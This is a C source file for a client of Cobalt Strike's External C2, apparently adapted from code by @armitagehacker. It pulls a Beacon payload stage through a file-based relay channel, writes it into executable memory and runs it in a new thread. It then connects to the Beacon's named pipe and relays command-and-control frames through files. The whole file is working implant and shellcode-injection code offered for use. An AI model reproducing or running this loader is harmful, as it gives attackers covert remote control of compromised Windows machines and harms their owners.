/* a quick-client for Cobalt Strike's External C2 server mostly code from @armitagehacker */ 

#include <stdio.h> 
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024


/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;
    /* read the 4-byte length */
    ReadFile(my_handle, (char * ) & size, 4, & temp, NULL);

    /* read the whole thing in */
    while (total < size) {
        Sleep(3000);
        ReadFile(my_handle, buffer + total, size - total, & temp, NULL);
        total += temp;
    }
  
    return size;
}

/* write a frame to a file */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(my_handle, (void * ) & length, 4, & wrote, NULL);
    WriteFile(my_handle, buffer, length, & wrote, NULL);
}


HANDLE start_beacon(char * payload, DWORD length){
    /* inject the payload stage into the current process */
    char * payloadE = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(payloadE, payload, length);
    printf("Injecting Code, %d bytes\n", length); 
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) payloadE, (LPVOID) NULL, 0, NULL);
    /*
     * connect to our Beacon named pipe */
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar",
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    
    }
    return(handle_beacon);
}

void put_file(char *fout,char *data, DWORD length){
    FILE *fo;
    fo = fopen(fout,"wb");
    fwrite(data, length, 1, fo);
    fclose(fo);
}

int pop_file(char *fin,char *data, DWORD max){
    FILE *fi;
	unsigned long fileLen;
	fi = fopen(fin, "rb");
	if (!fi){
	   fprintf(stderr, "Unable to open file %s\n", fin);
	   return(-1);
	}
  	fseek(fi, 0, SEEK_END);
	fileLen=ftell(fi);
	fseek(fi, 0, SEEK_SET);
    if(fileLen+1 > max){
	    fprintf(stderr, "Memory error!");
        fclose(fi);
	    return(-1);
	}
  	fread(data, fileLen, 1, fi);
	fclose(fi);
	return(fileLen);
}

off_t fsize(const char *filename) {
    struct stat st; 
    if (stat(filename, &st) == 0)
        return st.st_size;

    return -1; 
}

/* the main logic for our client */
void go(char * name) {
    /* xychix ask server for stage */
    /* xychix prepare stage for sending */
    /*
     * connect to the External C2 server */
    char fout[128]; 
    char fin[128];
    int len;
    sprintf(fout, "%s.bea", name);
    sprintf(fin, "%s.beb", name);
        
    put_file(fout,"go",2);
    while( fsize(fin) <= 0 ){
      Sleep( 2000 );
    }
  	Sleep( 10000 ); 
    char * srvpayload = malloc(PAYLOAD_MAX_SIZE);
    int srvpayloadLen = pop_file(fin,srvpayload,PAYLOAD_MAX_SIZE-1);
    put_file(fin,"",0);

    HANDLE handle_beacon = start_beacon(srvpayload, srvpayloadLen);

    /* setup our buffer */
    char * buffer = (char * ) malloc(BUFFER_MAX_SIZE);
    /*
     * relay frames back and forth */
    while (TRUE) {
        /* read from our named pipe Beacon */
        DWORD read = read_frame(handle_beacon, buffer,BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }else{
			printf("got %d bytes from pipe\n",read);
		}

        /* write to the External C2 server */
        //send_frame(socket_extc2, buffer, read);
        if(read > 1) {
			printf("writing %d bytes\n",read);
			put_file(fout,buffer,read);
    	}    
	
        /* read from the External C2 server */
		int size_beb = fsize(fin);
		if( size_beb > 0){
			printf("%d bytes waiting\n",size_beb); 
        	read = pop_file(fin, buffer, BUFFER_MAX_SIZE);
        	if (read < 0) {
        	    break;
        	}else{
        	  put_file(fin,"",0);
        	}
		}
        
        /* write to our named pipe Beacon */
        write_frame(handle_beacon, buffer, read); 
        Sleep(300);
    }

    /* close our handles */
    CloseHandle(handle_beacon);
}

void main(DWORD argc, char * argv[]) { 
    /* check our arguments */
    if (argc != 2) {
        printf("%s [name]\n", argv[0]);
        exit(1);
    }
    
    /* initialize winsock */
    WSADATA wsaData;
    WORD wVersionRequested;
    wVersionRequested = MAKEWORD(2, 2);
    WSAStartup(wVersionRequested, & wsaData);

    /* start our client */
    go(argv[1]);
}
